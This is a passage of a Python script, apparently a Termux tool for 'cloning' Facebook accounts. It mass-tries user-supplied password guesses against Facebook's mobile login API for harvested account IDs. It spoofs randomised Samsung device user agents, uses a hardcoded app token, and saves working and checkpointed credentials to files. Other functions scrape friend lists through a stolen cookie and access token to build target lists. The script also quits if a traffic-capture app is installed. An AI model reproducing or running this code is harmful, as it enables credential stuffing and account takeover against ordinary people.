                                abv = ['A','B','C']

                                if '8' in version:

                                        ipsw = '12'+random.choice(abv)+str(random.randint(11,99))

                                elif '9' in version:

                                        ipsw = '13'+random.choice(abv)+str(random.randint(11,99))

                                elif '10' in version:

                                        ipsw = '14'+random.choice(abv)+str(random.randint(11,99))

                                elif '11' in version:

                                        ipsw = '15'+random.choice(abv)+str(random.randint(11,99))

                                elif '12' in version:

                                        ipsw = '16'+random.choice(abv)+str(random.randint(11,99))

                                elif '13' in version:

                                        ipsw = '17'+random.choice(abv)+str(random.randint(11,99))

                                elif '14' in version:

                                        ipsw = '18'+random.choice(abv)+str(random.randint(11,99))

                                elif '15' in version:

                                        ipsw = '19'+random.choice(abv)+str(random.randint(11,99))

                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))

                                application_version_code=str(random.randint(000000000,999999999))

                                samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']

                                model,build = random.choice(samsung).split('|')

                                fbdv = model

                                fbsv = str(random.randrange(6,11))

                                fblc = 'ar_EG'

                                fbpn = 'com.facebook.katana'

                                fbav = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))

                                fban = 'FB4A'

                                fban = 'FB4A'

                                fbpn = 'com.facebook.katana'

                                fbav = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))

                                fbbv = '34'+str(random.randint(1111111,9999999))

                                fbcr = 'Ufone'

                                fbmf = 'Samsung'

                                fbbd = 'samsung'

                                fbdv = model

                                fbsv = str(random.randrange(6,11))

                                fbca = 'arm64-v8a'

                                fblc = 'ar_EG'

                                fbdm = '{desity=3.25,width=1080,height=2028}'

                                fb_fw = '1'

                                ua = 'Dalvik/2.1.0 (Linux; U; Android '+fbsv+'; '+fbdv+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBPN/'+fbpn+';FBLC/'+fblc+';FBBV/'+fbbv+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+fbsv+';FBCA/'+fbca+';FBDM/'+fbdm+';FB_FW/'+fb_fw+';]'

                                adid = str(uuid.uuid4())

                                device_id = str(random.randint(11111111,9999999999))

                                li = ['28','29','210']

                                li2 = random.choice(li)

                                j1 = ''.join(random.choice(digits) for _ in range(2))

                                j2 = li2+j1

                                #data = {'adid': adid, 'email': iid, 'password': pas, 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': model, 'device_id': adid, 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}

                                #head = {'user-agent': ua, 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': str(random.randint(2e4, 4e4)), 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': str(random.randint(2e4, 4e4)), 'x-fb-connection-bandwidth': str(random.randint(2e7, 3e7)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}

                                head = {'user-agent': 'Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))

+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': str(random.randint(2e4, 4e4)), 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': str(random.randint(2e4, 4e4)), 'x-fb-connection-bandwidth': str(random.randint(2e7, 3e7)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}

                                data = {'adid': adid, 'email': iid, 'password': pas, 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': model, 'device_id': adid, 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}

                                url = 'https://b-api.facebook.com/method/auth.login'

                                po = requests.post(url,data=data,headers=head).text

                                q = json.loads(po)

                                #print(po)

                                if 'session_key' in po:

                                        print(' \033[1;32m [WAHID-OK] '+iid+' | '+pas+'\033[0;97m')

                                        open('/sdcard/ids/ok.txt','a').write(iid+'|'+pas+'\n')

                                        ok.append(iid)

                                        break

                                elif 'www.facebook.com' in po:

                                        print(' \033[1;31m [WAHID-CP] '+iid+' | '+pas+'\033[0;97m')

                                        open('/sdcard/ids/cp.txt','a').write(iid+'|'+pas+'\n')

                                else:

                                        continue

                        loop+=1

                except Exception as e:

                      #  pass

                        print(e)

        def pasw(self):

                passlist = []

                os.system('clear')

                print(logo);xchker()

                pl = int(input(' How Much Password Do You Want To Add ? '))

                print(' Example first123,last123,khan123,firstlast')

                print(50*"-")

                for cd in range(pl):

                        passlist.append(input(f' ({cd+1}) Password : '))

                os.system('clear')

                print(logo);xchker()

                print(' Total Ids : '+str(len(self.id)))

                print(' Cloning Is Started Wait For Results')

                print(' After Every 5 Min Turn Airplane On/Off')

                print(50*'-')

                with ThreadPool(max_workers=30) as formSubmit:

                        for user in self.id:

                                iid,name = user.split('|')

                                if 'm1' in methods:

                                        formSubmit.submit(self.m1,iid,passlist)

                                elif 'm2' in methods:

                                        formSubmit.submit(self.m2,iid,passlist)

                                else:

                                        formSubmit.submit(self.m1,iid,passlist)

                print(50*'-')

                print(' SucessFully Process Is Completed ')

                print(' Total Ok Ids : '+str(len(ok)))

                print(' Ok Ids Save In : /sdcard/qsr_ok.txt')

                print(50*'-')

                input('\n Press enter to back ')

                main()

def create_file():

        os.system('clear')

        print(logo);xchker()

        print(' [1] Create File ')

        print(' [2] Remove Double Ids ')

        print(' [3] Seprate Ids ')

        print(' [0] Back')

        print(50*'-')

        create_ = input(' Select : ')

        if create_ == "1":

                create_file_login()

        elif create_ == "2":

                double()

        elif create_ == "3":

                sep()

        elif create_ == "0":

                main()

        else:

                exit('invalid select')

        mycrackistan() 

def create_file_login():

        ids = []

        total = []

        xyz = requests.Session()

        os.system('clear')

        print(logo);xchker()

        try:

                cok = open('fb_cookies.txt','r').read()

                cookies = {'cookie':cok}

                access_token = open('access_token.txt', 'r').read()

        except FileNotFoundError:

                login()

        try:

                check_cookies = xyz.get('https://graph.facebook.com/me?access_token='+access_token,cookies=cookies).text

                load = json.loads(check_cookies)

                iid = load['id']

                name = load['name']

        except KeyError:

                print('\n Cookies has expired')

                time.sleep(1)

                os.system('rm -rf .fb_cookies.txt .access_token.txt')

                login()

        except requests.exceptions.ConnectionError:

                print(' No internet connection ...')

        os.system('clear')

        print(logo);xchker()

        print("[1] Create File Mix Ids")

        print("[2] Create File New Ids")

        print(44*"-")

        typp = input('select : ')

        if typp == "1":

                auto_file(cookies,access_token)

        elif typp == "2":

                new_file(cookies,access_token)

        else:

                auto_file(cookies,access_token)

def auto_file(cookies,access_token):

        global total

        os.system('clear & rm -rf .txt .temp.txt')

        os.system('clear')

        print(logo);xchker()

        try:

                fl = 1

        except:

                fl = 1

        for xd in range(fl):

                idt = input(f' Put id {xd+1}: ')

                try:

                        fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)

                        xyz = requests.Session()

                        r = xyz.get(fd_url,cookies=cookies).text

                        q = json.loads(r)

                        for iid in q['friends']['data']:

                                uid = iid['id']

                                open('.txt','a').write(uid+'\n')

                except KeyError:

                        print(' No Friend List : '+idt)

                        time.sleep(3)

                        return auto_file(cookies,access_token)

                except requests.exceptions.ConnectionError:

                        print(' No internet connection ....')

        sid = "1"

        os.system('cat .txt | grep "'+sid+'" > .temp.txt')

        file = open('.temp.txt','r').read().splitlines()

        print('\n \033[1;97m /sdcard/xxx1.txt \033[0;97m\n')

        #100010138361148

        sf = input(' Saved File As : ')

        print('')

        os.system('clear')

        print(logo);xchker()

        print(' Total ids To Dump: '+str(len(file)))

        print(' Dumping Is Started Wait ....')

        print(50*'-')

        with ThreadPool(max_workers=20) as yaari:

                for exid in file:

                        yaari.submit(iamBadBoy, exid,cookies,access_token,sf)

        print(' Total ids Extracted : '+str(len(total)))

        input(' Press enter to back ')

        main()

def new_file(cookies,access_token):

        global total

        os.system('clear & rm -rf .txt .temp.txt')

        os.system('clear')

        print(logo);xchker()

        try:

                fl = 1

        except:

                fl = 1

        for xd in range(fl):

                idt = input(f' Put id {xd+1}: ')

                try:

                        fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)

                        xyz = requests.Session()

                        r = xyz.get(fd_url,cookies=cookies).text

                        q = json.loads(r)

                        for iid in q['friends']['data']:

                                uid = iid['id']

                                open('.txt','a').write(uid+'\n')

                except KeyError:

                        print(' No Friend List : '+idt)

                        time.sleep(3)

                        return auto_file(cookies,access_token)

                except requests.exceptions.ConnectionError:

                        print(' No internet connection ....')

        print('\n\033[1;92m Example: 100087,100088 etc\033[0;97m')

        try:

                sl = int(input('\n How Many Links To Grab : '))

        except:

                sl = 1

        for el in range(sl):

                sid = input(f' Put {el+1} link: ')

                os.system('cat .txt | grep "'+sid+'" > .temp.txt')

        file = open('.temp.txt','r').read().splitlines()

        print('\n \033[1;97m /sdcard/xxx1.txt \033[0;97m\n')

        #100010138361148

        sf = input(' Saved File As : ')

        print('')

        os.system('clear')

        print(logo);xchker()

        print(' Total ids To Dump: '+str(len(file)))

        print(' Dumping Is Started Wait ....')

        print(50*'-')

        with ThreadPool(max_workers=20) as yaari:

                for exid in file:

                        yaari.submit(iamBadBoy, exid,cookies,access_token,sf)

        try:

                son = f"qaiser{str(random.randint(0,90))}.txt"

        except:

                son = f"qaiser{str(random.randint(10,50))}.txt"

        os.system(f'cat {sf} | grep "'+sid+'" > /sdcard/'+son+'')

        print(' Total ids Extracted : '+str(len(total)))

        print(' New ids Saved As : /sdcard/'+son)

        print(' Normal ids Saved As : '+sf)

        input(' Press enter to back ')

        main()

def iamBadBoy(exid,cookies,access_token,sf):

        try:

                global total,loop

                fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(exid,access_token)

                xyz = requests.Session()

                r = xyz.get(fd_url,cookies=cookies).text

                q = json.loads(r)

                for yaad in q['friends']['data']:

                        iid = yaad['id']

                        name = yaad['name']

                        total.append(iid)

                        open(sf,'a').write(iid+'|'+name+'\n')

                loop+=1

                sys.stdout.write('\r Dumping Ids [%s] : [%s]\r'%(loop,len(total)));sys.stdout.flush()

        except requests.exceptions.ConnectionError:

                print(' No internet connection ...')

        except Exception as e:

                pass

                #print(e)

        except KeyError:

                pass

def sep():

        xchker()

        os.system('clear');print(logo);xchker()

        try:

                limit = int(input(' How many links do you want to separate ? '))

        except:

                limit = 1

        print(f'{rg} File Path Example /sdcard/xxx.txt{s}')

        file_name = input('\033[0m Input file path : ')

        print(f'{rg} Save As Example /sdcard/newfile.txt{s}')

        new_save = input('\033[0m Save new file as : ')

        y = 0

        print(f"{ro} Ids To Grabb Ex [ 100087,10000,10006 etc ]{s}")

        for k in range(limit):

                y+=1

                links=input(' Put Uid Type : ')

                os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)

        print(44*"\033[0m-")

        print(f'{rc} ids grabbed successfully{s}')

        print(' Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))

        print('\033[0m New file saved as : \033[0;33m '+new_save)

        print(44*"\033[0m-")

        input('\033[0m[Press enter to back] ')

        main()

def double():

        os.system('clear')

        print(logo);xchker()

        user_file = input('File Path : ')

        try:

                open(user_file,'r').read()

                print(' \n\033[1;97mExample: /sdcard/xxx.txt\n\033[0;97m')

                save_file = input('Save new file as: ')

                os.system('touch '+save_file)

                os.system('sort -r '+user_file+' | uniq > '+save_file)

                print(50*'-')

                print(' Fully Removed Multi Lines Ids')

                print(' Dublicate Lines Removed From File')

                print(' File Saved As : '+save_file)

                print(50*'-')

                input('Press enter to back ')

                main()

        except FileNotFoundError:

                print(' Invalid File ')

#----[http-capture]----

try:

        a = "anar"

        t="tt"

        fileee = os.listdir('/sdcard/Android/data/')

        if f'com.h{t}pc{a}y.pro' in fileee:

                print('error occur 0')

                exit()

                exit(f'\nsomethiiing went wrong\n\nContact Admin : +923197951815')

except Exception as e:

        print(e)

        pass

except PermissionError:

        pass

#----[if-fork]------

'''pat = os.getcwd()

datar = []

datar.append(pat)

if '/data/data/com.termux/files/home/Qsr' in datar:

        pass

else:

        for i in range(5000):

                print(" data is forked / or in other file")

        exit("Type > cd ~ && python jan.py")'''

if not os.path.exists('.fam'):

        main()

else:

        main()
